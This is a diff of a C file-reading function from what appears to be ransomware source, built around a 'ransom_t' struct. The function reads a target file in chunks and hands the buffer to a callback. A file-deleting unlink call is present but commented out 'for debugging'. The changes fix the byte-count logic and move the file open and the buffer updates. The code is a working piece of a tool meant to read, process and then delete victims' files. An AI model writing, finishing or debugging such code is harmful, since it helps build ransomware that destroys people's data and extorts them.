@@ -23,38 +23,38 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 
 	lstat(filepath, &file_info);
 	ransom->target_file_buf->file_info = file_info;
-	fd = fopen(filepath, "rb");
 	if(file_info.st_size == 0)
 	{
-		fclose(fd);
 		fprintf(stderr, "File is empty\n");
 		return(0);
 	}
+	fd = fopen(filepath, "rb");
 	fseek(fd, file_offset, SEEK_SET);
 #ifndef DEBUG_H
-	printf("----------------------------------------------\n");
+	printf("\n\n----------------------------------------------\n");
 	printf("st_size: %d - file_offset: %d == %d\n", (int)file_info.st_size, (int)ransom->target_file_buf->file_offset, (int)file_info.st_size - (int)ransom->target_file_buf->file_offset);
+	printf("bytes_read: %d\n", (int)bytes_read);
+	getchar();
 #endif
 	if ((int)file_info.st_size - (int)file_offset > BIGBUF)
 	{
 		bytes_read = BIGBUF;
 	}
 	else
-		bytes_read = (size_t)file_info.st_size;
-	ransom->target_file_buf->bytes_read = bytes_read;
-	ransom->target_file_buf->file_offset += bytes_read;
+		bytes_read = (size_t)file_info.st_size - file_offset;
 	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
-
-	/* DEBUGGING BLOCK */
-	ransom->target_file_buf->buf[bytes_read] = '\0';
-	/* END DEBUGGING BLOCK */
-
-	if(fxn)
-		fxn(ransom->target_file_buf->buf, ransom);
 	fclose(fd);
 	/* Disabled for debugging
 	unlink(filepath);
 	*/
+	/* update tmp buffer struct to use in main. */
+	ransom->target_file_buf->buf[bytes_read] = '\0';
+	ransom->target_file_buf->file_offset += bytes_read;
+	ransom->target_file_buf->bytes_read = bytes_read;
+
+	/* call external function */
+	if(fxn)
+		fxn(ransom->target_file_buf->buf, ransom);
 	return (bytes_read);
 }
 
